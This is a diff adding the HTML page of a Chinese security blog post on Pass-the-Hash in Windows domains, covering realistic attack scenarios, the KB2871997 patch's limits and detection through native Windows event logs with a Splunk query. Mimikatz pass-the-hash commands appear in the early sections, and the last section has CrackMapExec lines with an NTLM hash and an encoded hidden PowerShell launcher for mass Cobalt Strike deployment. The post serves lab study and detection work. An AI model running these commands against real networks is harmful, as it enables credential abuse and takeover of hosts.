@@ -1,0 +1,612 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no">
+<meta name="author" content="Fazx">
+
+
+
+<meta name="description" content="‮">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Pass the Hash再思考：场景、补丁与监测">
+<meta property="og:url" content="0sec.com.cn/2022-08-21/index.html">
+<meta property="og:site_name" content="Cosmic Fragments">
+<meta property="og:description" content="‮">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="/img/20220821001111.png">
+<meta property="og:image" content="/img/20220821001404.png">
+<meta property="og:image" content="/img/20220821001621.png">
+<meta property="og:image" content="/img/20220821171139.png">
+<meta property="og:image" content="/img/20220821002959.png">
+<meta property="og:image" content="/img/20220821003533.png">
+<meta property="og:image" content="/img/20220816155023.png">
+<meta property="og:image" content="/img/20220816155131.png">
+<meta property="og:image" content="/img/20220821005854.png">
+<meta property="og:image" content="/img/20220821013752.png">
+<meta property="og:image" content="/img/20220821115435.png">
+<meta property="og:image" content="/img/20220821165633.png">
+<meta property="og:image" content="/img/20220825195329.png">
+<meta property="og:image" content="/img/20220821172324.png">
+<meta property="og:image" content="/img/20220821174441.png">
+<meta property="og:image" content="/img/20220825195116.png">
+<meta property="og:updated_time" content="2024-05-29T07:03:54.124Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Pass the Hash再思考：场景、补丁与监测">
+<meta name="twitter:description" content="‮">
+<meta name="twitter:image" content="/img/20220821001111.png">
+
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="Cosmic Fragments" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>Pass the Hash再思考：场景、补丁与监测 | Cosmic Fragments</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script> yiliaConfig.jquery_ui = [false]; </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+    <script>
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "//hm.baidu.com/hm.js?16b144395cc20d4a7b4ab64227601921";
+            var s = document.getElementsByTagName("script")[0]; 
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+
+</head></html>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">Fazx</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">OSCP, OSWP, Security+, @Orange Cyberdefense</p>
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa 豆瓣" href="https://www.douban.com/people/faithandchange/" title="豆瓣"></a>
+                            
+                                <a class="fa 知乎" href="https://www.zhihu.com/people/ping2u" title="知乎"></a>
+                            
+                                <a class="fa GitHub" href="https://github.com/Fazx" title="GitHub"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                
+                
+
+                
+                
+                <section class="switch-part switch-part3">
+                
+                    <div id="js-aboutme">一个喜欢读和写的伪理科生。</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Fazx</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">Fazx</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">OSCP, OSWP, Security+, @Orange Cyberdefense</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa 豆瓣" target="_blank" href="https://www.douban.com/people/faithandchange/" title="豆瓣"></a>
+                            
+                                <a class="fa 知乎" target="_blank" href="https://www.zhihu.com/people/ping2u" title="知乎"></a>
+                            
+                                <a class="fa GitHub" target="_blank" href="https://github.com/Fazx" title="GitHub"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-Pass-the-Hash再思考：场景、补丁与监测" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2022-08-21/" class="article-date">
+      <time datetime="2022-08-21T10:18:55.000Z" itemprop="datePublished">2022-08-21</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Pass the Hash再思考：场景、补丁与监测
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>‮<br><a id="more"></a></p>
+<h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><p>本文讨论的主要内容：</p>
+<ul>
+<li>对PTH攻击应用场景的思考</li>
+<li>KB22871997能否防御PTH攻击</li>
+<li>基于Windows（原生）日志的PTH攻击监测</li>
+</ul>
+<h2 id="错误的攻击场景"><a href="#错误的攻击场景" class="headerlink" title="错误的攻击场景"></a>错误的攻击场景</h2><p>第一次PTH的应用场景有点问题，来看步骤</p>
+<blockquote>
+<p>攻击机：192.168.146.76 / Windows Server 2019<br>被攻击机：192.168.146.78 / Windows Server 2012 Standard(Build 9200)<br>均已加域，Administrator为本地管理员账号，拥有相同的密码</p>
+</blockquote>
+<p><img src="/img/20220821001111.png" alt></p>
+<p>在2019这台上用本地管理员Administrator，mimikatz读到Administrator的NTLM值，直接PTH：</p>
+<pre><code>mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:administrator /domain:OCDCHINA /ntlm:xxxxxxxxxxx&quot;
+</code></pre><p><img src="/img/20220821001404.png" alt></p>
+<p><img src="/img/20220821001621.png" alt></p>
+<p>从结果来看PTH是成功的，文件列出了，用PsExec也能获取到受害机的权限</p>
+<p>但是思考这个攻击的场景，是使用本地管理员攻击，获取到的另一个本地管理员权限，虽然这两台都加域了，但其实整个攻击流程和域没有什么关系。并且这两个Administrator账号密码其实是相同的，直接用PsExec也能相互获取到权限，并不需要打这一个PTH。</p>
+<p><img src="/img/20220821171139.png" alt></p>
+<p>（PsExec是通过SMB服务连接文件共享，上传文件，使用SCM创建/启动服务来获取权限的，详细原理见<a href="https://mp.weixin.qq.com/s?__biz=MzkxNDMxMTQyMg==&amp;mid=2247493127&amp;idx=1&amp;sn=a0b0e55b42e6623dc5ded37504797a15" target="_blank" rel="noopener">psexec原理分析和实现</a>，作者：想做嘉然小姐的狗）</p>
+<h2 id="更好的攻击场景"><a href="#更好的攻击场景" class="headerlink" title="更好的攻击场景"></a>更好的攻击场景</h2><p>更好的攻击场景，我理解应该是拿下一台<strong>域内机器</strong>的权限（比如获取到webshell）后，提权到Adninistrator或SYSTEM这样的<strong>高权限</strong>，然后从这台机器上试图抓到<strong>域管账号哈希</strong>，使用这个哈希控制任意的域内终端。</p>
+<h3 id="缓存域管NTLM-HASH"><a href="#缓存域管NTLM-HASH" class="headerlink" title="缓存域管NTLM HASH"></a>缓存域管NTLM HASH</h3><p>为了抓到NTLM HASH进行下一步横向，这里一共模拟了4种域管账号认证过程，看看是否会将NTLM HASH缓存到本地：</p>
+<blockquote>
+<p>RDP：可以抓到哈希</p>
+</blockquote>
+<p>从域控使用域管账号3389登录攻击机（横移起点）</p>
+<p>4624 <code>Logon Type=3(Network)</code></p>
+<p><img src="/img/20220821002959.png" alt></p>
+<blockquote>
+<p>SMB：抓不到</p>
+</blockquote>
+<p>先开启SMB服务，可以直接开启一个文件共享，然后从域控</p>
+<pre><code>\\192.168.146.56\c$
+</code></pre><p>注意这里要输入IP而不是主机名， IP会使用NTLM协议，而主机名会使用Kerberos。</p>
+<p><img src="/img/20220821003533.png" alt></p>
+<p>从Windows Security日志可以看到4624登录成功中的详情也是NTLM认证，但是很奇怪这种方式抓不到缓存的哈希。</p>
+<blockquote>
+<p>Windows Credential Manager：抓到密码明文</p>
+</blockquote>
+<p><img src="/img/20220816155023.png" alt></p>
+<blockquote>
+<p>加域后重启前：抓到密码明文</p>
+</blockquote>
+<p><img src="/img/20220816155131.png" alt></p>
+<p>注意：以上所有的认证过程发生在DC和攻击机这两台2019之间，所以不存在2012低于R2版本导致明文存储的问题。</p>
+<h3 id="攻击流程复现"><a href="#攻击流程复现" class="headerlink" title="攻击流程复现"></a>攻击流程复现</h3><blockquote>
+<p>DC：192.168.146.76 / Windows Server 2019<br>攻击机：192.168.146.73(56) / Windows Server 2019 （横向移动的起点）<br>受害机：192.168.146.78 / Winodows Server 2012 Standard(Build 9200)<br>域管账号adminE*</p>
+</blockquote>
+<p>域管3389登录攻击机以后，在攻击机本地缓存了NTLM HASH</p>
+<p><img src="/img/20220821005854.png" alt></p>
+<p>模拟内网中横向移动的场景，攻击者在这台2019上抓到哈希且无法解出明文的时候使用PTH。由于这里抓到的是域管账号的哈希，攻击者可以使用其登录任意一台域内主机，即获取到了整个域的权限。</p>
+<p><img src="/img/20220821013752.png" alt></p>
+<p>当然，更直接的利用是直接打域控。</p>
+<h2 id="关于KB22871997补丁"><a href="#关于KB22871997补丁" class="headerlink" title="关于KB22871997补丁"></a>关于KB22871997补丁</h2><p>在<a href="https://xz.aliyun.com/t/9842#toc-9" target="_blank" rel="noopener">谭谈哈希传递那些世人皆知的事</a> 这篇文章里作者写的：</p>
+<p><img src="/img/20220821115435.png" alt></p>
+<blockquote>
+<p>“PTH杀手”的更新使本地帐号不再可以用于远程接入系统…无法通过本地管理员权限对远程计算机…</p>
+</blockquote>
+<p>但其实通过我们上面对攻击场景的思考可以知道，PTH攻击的场景应该是用<strong>域管而非本地管理员</strong>的权限做横向移动，包括他这篇文章里复现的也是用域管账号打PTH，所以1997这个补丁对这种情况的攻击并不起作用。1997补丁最主要的作用就是使内存中默认不再缓存明文密码，而这个作用对哈希传递也没有影响，相反恰恰是给了PTH真正的应用价值，即在明文口令未知的情况下做内网横向移动。</p>
+<p>此外他第二段写的SID 500的账号是例外，以及<a href="https://xz.aliyun.com/t/8117#toc-11" target="_blank" rel="noopener">PTH的”转折点”</a>这里也写的1997补丁之后没法使用SID非500的账户做PTH，但是我实测了一下还是可以的，在Server2012上使用本地管理员账号，读到SID非500的域管账号，利用这个仍然可以做PTH的横移（这里打的是Server2019）：</p>
+<p><img src="/img/20220821165633.png" alt></p>
+<p>获得的是域管账号权限：</p>
+<p><img src="/img/20220825195329.png" alt></p>
+<p>所以究其根本，Pass the Hash是NTLM协议挑战/响应(challenge/response)机制的缺陷，只要使用了NTLM协议，用户容易遭受Pass the Hash攻击的问题就会一直存在。微软也只能建议使用更安全的Kerberos协议来代替NTLM协议。</p>
+<h2 id="基于Windows（原生）日志的攻击监测"><a href="#基于Windows（原生）日志的攻击监测" class="headerlink" title="基于Windows（原生）日志的攻击监测"></a>基于Windows（原生）日志的攻击监测</h2><p><img src="/img/20220821172324.png" alt></p>
+<p>上图分别是从攻击源、目的和域控三个位置，汇总的在正常NTLM认证过程中和PTH攻击过程中产生的Windows事件日志。<a href="https://blog.netwrix.com/2021/11/30/how-to-detect-pass-the-hash-attacks/" target="_blank" rel="noopener">来自</a></p>
+<p>从蓝队视角做基于日志的攻击行为监测，可以看到受害终端在经历PTH攻击后产生的日志，与一次正常的NTLM认证过程是完全一致的（4624 <code>Logon Type=3</code> &amp; 4672），因此从受害方并不能感知到此次NTLM认证过程是一次PTH攻击。DC的日志上相应都产生了4776验证账户凭据的事件，区别是正常过程还会跟两条Kerberos的验证请求。也不是很好做，比较直观的还是应该从攻击源看4624的<code>Logon Type=9</code>的日志，在我的环境里面也找到了这一条的详细内容：</p>
+<p><img src="/img/20220821174441.png" alt></p>
+<pre><code>An account was successfully logged on.
+
+Subject:
+    Security ID:        WIN10\fazx
+    Account Name:        fazx
+    Account Domain:        WIN10
+    Logon ID:        0x48BE9
+
+Logon Information:
+    Logon Type:        9
+    Restricted Admin Mode:    -
+    Virtual Account:        No
+    Elevated Token:        Yes
+
+Impersonation Level:        Impersonation
+
+New Logon:
+    Security ID:        WIN10\fazx
+    Account Name:        fazx
+    Account Domain:        WIN10
+    Logon ID:        0x1D43FC7
+    Linked Logon ID:        0x0
+    Network Account Name:    admine*
+    Network Account Domain:    OCDCHINA
+    Logon GUID:        {00000000-0000-0000-0000-000000000000}
+
+Process Information:
+    Process ID:        0x11f4
+    Process Name:        C:\Windows\System32\svchost.exe
+
+Network Information:
+    Workstation Name:    -
+    Source Network Address:    ::1
+    Source Port:        0
+
+Detailed Authentication Information:
+    Logon Process:        seclogo
+    Authentication Package:    Negotiate
+    Transited Services:    -
+    Package Name (NTLM only):    -
+    Key Length:        0
+</code></pre><p>易于监测的点就是<code>Logon Type:        9</code>和<code>Logon Process:        seclogo</code></p>
+<p>Splunk Search Processing Language (SPL)：</p>
+<pre><code>index=xxx (EventCode=4624) &quot;Logon Type:        9&quot; &quot;Logon Process:        seclogo&quot;
+| table  _time Account_Name Source_Network_Address Security_ID ComputerName Keywords       
+| sort  -_time
+</code></pre><p>4672日志：</p>
+<p><img src="/img/20220825195116.png" alt></p>
+<p>4672日志里就只有进行攻击的本地管理员账户，没有冒充的域管账户，如果要监测的话只能针对本地管理员而非SYSTEM的4672事件做监控。</p>
+<p>可能会有点反直觉哪有从攻击源监测攻击的，但是这已经是右移到了内网的横向阶段，所以其实对Source Host的监测是完全可以做的。</p>
+<p>当然，我这里写的是基于原生Windows日志的监测，如果装了一些Agent比如Sysmon，那能产生进程调用日志的时候思路就更多更简单了。</p>
+<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>域环境对于哈希传递不是必要条件，在工作组环境中也可以：</p>
+<pre><code>mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:administrator /domain:目标机器IP /ntlm:xxxxxx&quot;
+</code></pre><p>使用MSF的<code>use exploit/windows/smb/psexec</code></p>
+<p>使用CrackMapExec批量哈希传递，批量CS上线</p>
+<pre><code>cme smb 10.73.147.90 10.73.147.88 -u administrator -H 852a844adfce18f66009b4f14e0a98de
+cme smb 10.211.55.51  10.211.55.52 -u administrator  -H 852a844adfce18f66009b4f14e0a98de -x &quot;powershell -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0...&quot;
+</code></pre>
+      
+    </div>
+    
+  </div>
+  
+    
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2023-02-13/">
+                    Honeypot-Factory: The Use of Deception in ICS/OT Environments
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2022-02-26/">
+                    RFID初探之M1卡的分析与复制（使用PN532模块）
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Intro"><span class="toc-number">1.</span> <span class="toc-text">Intro</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#错误的攻击场景"><span class="toc-number">2.</span> <span class="toc-text">错误的攻击场景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#更好的攻击场景"><span class="toc-number">3.</span> <span class="toc-text">更好的攻击场景</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#缓存域管NTLM-HASH"><span class="toc-number">3.1.</span> <span class="toc-text">缓存域管NTLM HASH</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#攻击流程复现"><span class="toc-number">3.2.</span> <span class="toc-text">攻击流程复现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#关于KB22871997补丁"><span class="toc-number">4.</span> <span class="toc-text">关于KB22871997补丁</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#基于Windows（原生）日志的攻击监测"><span class="toc-number">5.</span> <span class="toc-text">基于Windows（原生）日志的攻击监测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#其他"><span class="toc-number">6.</span> <span class="toc-text">其他</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-4 i,
+        .toc-level-4 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"Pass the Hash再思考：场景、补丁与监测　| Cosmic Fragments　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2023-02-13/" title="上一篇: Honeypot-Factory: The Use of Deception in ICS/OT Environments">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2022-02-26/" title="下一篇: RFID初探之M1卡的分析与复制（使用PN532模块）">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2023-10-28/">窗口期的OSCP(PEN-200-2023)总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2023-07-14/">OSCP NOTE (Cheatsheet)</a></li><li class="post-list-item"><a class="post-list-link" href="/2023-04-30/">50台Vulnhub靶机Walkthrough</a></li><li class="post-list-item"><a class="post-list-link" href="/2023-02-13/">Honeypot-Factory: The Use of Deception in ICS/OT Environments</a></li><li class="post-list-item"><a class="post-list-link" href="/2022-08-21/">Pass the Hash再思考：场景、补丁与监测</a></li><li class="post-list-item"><a class="post-list-link" href="/2022-02-26/">RFID初探之M1卡的分析与复制（使用PN532模块）</a></li><li class="post-list-item"><a class="post-list-link" href="/2022-02-13/">Websocket渗透测试指北</a></li><li class="post-list-item"><a class="post-list-link" href="/2021-12-14/">关于log4j、log4shell的一些记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2021-11-27/">红队视角下的信息收集（备忘 && 持续收集）</a></li><li class="post-list-item"><a class="post-list-link" href="/2020-07-30/">Linux Basic for Hackers</a></li><li class="post-list-item"><a class="post-list-link" href="/2020-02-09/">安全相关HTTP响应头解读、配置、示例与检测</a></li><li class="post-list-item"><a class="post-list-link" href="/2019-10-31/">Cobaltstrike Server持久化 & Cobaltstrike与Metasploit相互派生shell</a></li><li class="post-list-item"><a class="post-list-link" href="/2019-08-21/">深入了解子域名挖掘tricks</a></li><li class="post-list-item"><a class="post-list-link" href="/2019-05-14/">Android开发实践之计算器&记事助手</a></li><li class="post-list-item"><a class="post-list-link" href="/2019-04-13/">用Origin请求头防御CSRF攻击(译文)</a></li><li class="post-list-item"><a class="post-list-link" href="/2019-04-07/">PHP中的随机数安全问题</a></li><li class="post-list-item"><a class="post-list-link" href="/2019-03-20/">WordPress 5.1.1 CSRF to RCE 跟进分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2019-02-15/">XML外部实体注入(XXE攻击)小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019-01-26/">Django开发小记 & Docker笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-12-22/">前端安全之CSP、同源策略与跨域请求(JSONP/CORS)</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-12-01/">使用Aircrack-ng破解WPA2协议无线网络</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-11-11/">PHP博客管理系统开发全记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-10-10/">环境配置踩坑记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-08-30/">区块链基础[待补充]</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-08-05/">校园网免流攻略(基于逻辑漏洞、DNS伪装包或IPv6)</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-07-11/">基于Scrapy-Redis框架与Mongodb的分布式爬虫-elasticsearch搜索引擎打造</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-05-26/">《渗透测试实践指南》阅读笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-05-16/">「Web向」XCTF联赛2018年度考点知识总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-05-14/">「娱乐向」 Hack for Fun</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-05-12/">从一道取证题目谈NTFS交换数据流</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-05-10/">关于Xdebug的那些事儿</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-04-26/">PHP弱类型&&md5碰撞总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-04-24/">Hello World</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2018-2024 Fazx
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 5;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+            
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+    <script>
+        var originTitle = document.title;
+        var titleTime;
+        document.addEventListener("visibilitychange", function() {
+            if (document.hidden) {
+                document.title = "!!!∑(ﾟДﾟノ)ノ快回来!!!  " + originTitle;
+                clearTimeout(titleTime);
+            }
+            else {
+                document.title = "" + originTitle;
+                titleTime = setTimeout(function() {
+                    document.title = originTitle;
+                }, 2000);
+            }
+        })
+    </script>
+
+<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
